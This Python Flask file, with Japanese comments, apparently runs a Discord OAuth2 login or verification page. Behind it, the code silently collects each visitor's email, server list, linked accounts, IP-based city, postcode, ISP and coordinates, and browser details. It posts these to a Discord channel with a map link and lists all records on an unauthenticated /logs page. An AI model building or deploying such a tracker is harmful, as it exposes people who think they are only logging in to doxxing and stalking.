# main.py

from flask import Flask, request, render_template, redirect
import requests, json, os, threading
from dotenv import load_dotenv
from datetime import datetime
from discord_bot import bot  # あなたのdiscord_bot.pyにBot処理を実装済みとする
from user_agents import parse

load_dotenv()

app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")

# --- IP取得 ---
def get_client_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr

# --- IPジオロケーション ---
def get_geo_info(ip):
    try:
        res = requests.get(
            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,lat,lon,proxy,hosting,query"
        )
        data = res.json()
        return {
            "ip": data.get("query"),
            "country": data.get("country", "不明"),
            "region": data.get("regionName", "不明"),
            "city": data.get("city", "不明"),
            "zip": data.get("zip", "不明"),
            "isp": data.get("isp", "不明"),
            "as": data.get("as", "不明"),
            "lat": data.get("lat"),
            "lon": data.get("lon"),
            "proxy": data.get("proxy", False),
            "hosting": data.get("hosting", False)
        }
    except:
        return {
            "ip": ip, "country": "不明", "region": "不明", "city": "不明",
            "zip": "不明", "isp": "不明", "as": "不明",
            "lat": None, "lon": None, "proxy": False, "hosting": False
        }

# --- ログ保存 ---
def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    if discord_id not in logs:
        logs[discord_id] = {"history": []}
    data["timestamp"] = now
    logs[discord_id]["history"].append(data)
    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

# --- ルート（ログインページ） ---
@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)

# --- コールバック（OAuth2処理） ---
@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify email guilds connections"
    }
    try:
        res = requests.post(token_url, data=data, headers=headers)
        res.raise_for_status()
        token = res.json()
    except requests.exceptions.RequestException as e:
        return f"トークン取得エラー: {e}", 500

    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    # ユーザー情報取得
    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
    connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()

    # Botでサーバー参加
    requests.put(
        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
        headers={
            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
            "Content-Type": "application/json"
        },
        json={"access_token": access_token}
    )

    # IP情報取得
    ip = get_client_ip()
    if ip.startswith(("127.", "10.", "192.", "172.")):
        ip = requests.get("https://api.ipify.org").text
    geo = get_geo_info(ip)

    # User-Agent解析
    ua_raw = request.headers.get("User-Agent", "不明")
    ua = parse(ua_raw)

    avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"

    data = {
        "username": user.get("username"),
        "discriminator": user.get("discriminator"),
        "id": user.get("id"),
        "email": user.get("email"),
        "locale": user.get("locale"),
        "verified": user.get("verified"),
        "mfa_enabled": user.get("mfa_enabled"),
        "premium_type": user.get("premium_type"),
        "flags": user.get("flags"),
        "public_flags": user.get("public_flags"),
        "avatar_url": avatar_url,
        "ip": geo["ip"],
        "country": geo["country"],
        "region": geo["region"],
        "city": geo["city"],
        "zip": geo["zip"],
        "isp": geo["isp"],
        "as": geo["as"],
        "lat": geo["lat"],
        "lon": geo["lon"],
        "proxy": geo["proxy"],
        "hosting": geo["hosting"],
        "user_agent_raw": ua_raw,
        "user_agent_os": ua.os.family,
        "user_agent_browser": ua.browser.family,
        "user_agent_device": "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other",
        "user_agent_bot": ua.is_bot,
        "guilds": guilds,
        "connections": connections,
    }

    save_log(user["id"], data)

    # Botへログ送信・役職付与など非同期処理
    try:
        embed_data = {
            "title": "✅ 新しいアクセスログ",
            "description": (
                f"**名前:** {data['username']}#{data['discriminator']}\n"
                f"**ID:** {data['id']}\n"
                f"**IP:** {data['ip']} / Proxy: {data['proxy']} / Hosting: {data['hosting']}\n"
                f"**メール:** {data['email']}\n"
                f"**Premium:** {data['premium_type']} / Locale: {data['locale']}\n"
                f"**UA:** `{data['user_agent_raw']}`\n"
                f"**OS:** {data['user_agent_os']} / ブラウザ: {data['user_agent_browser']}\n"
                f"**デバイス:** {data['user_agent_device']} / Bot判定: {data['user_agent_bot']}\n"
                f"**国:** {data['country']} / {data['region']} / {data['city']} / {data['zip']}\n"
                f"**ISP:** {data['isp']} / AS: {data['as']}\n"
                f"📍 [地図リンク](https://www.google.com/maps?q={data['lat']},{data['lon']})\n"
                f"**サーバー数:** {len(guilds)} / **外部連携:** {len(connections)}"
            ),
            "thumbnail": {"url": data["avatar_url"]},
            "fields": [
                {"name": "緯度", "value": str(data["lat"]), "inline": True},
                {"name": "経度", "value": str(data["lon"]), "inline": True}
            ]
        }
        bot.loop.create_task(bot.send_log(embed=embed_data))

        if data["proxy"] or data["hosting"]:
            bot.loop.create_task(bot.send_log(
                f"⚠️ **不審なアクセス検出**\n"
                f"{data['username']}#{data['discriminator']} (ID: {data['id']})\n"
                f"IP: {data['ip']} / Proxy: {data['proxy']} / Hosting: {data['hosting']}"
            ))

        bot.loop.create_task(bot.assign_role(user["id"]))
    except Exception as e:
        print("Embed送信エラー:", e)

    return render_template("welcome.html", username=data["username"], discriminator=data["discriminator"])

# --- ログ一覧表示 ---
@app.route("/logs")
def show_logs():
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    return render_template("logs.html", logs=logs)

def run_bot():
    bot.run(DISCORD_BOT_TOKEN)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=10000)
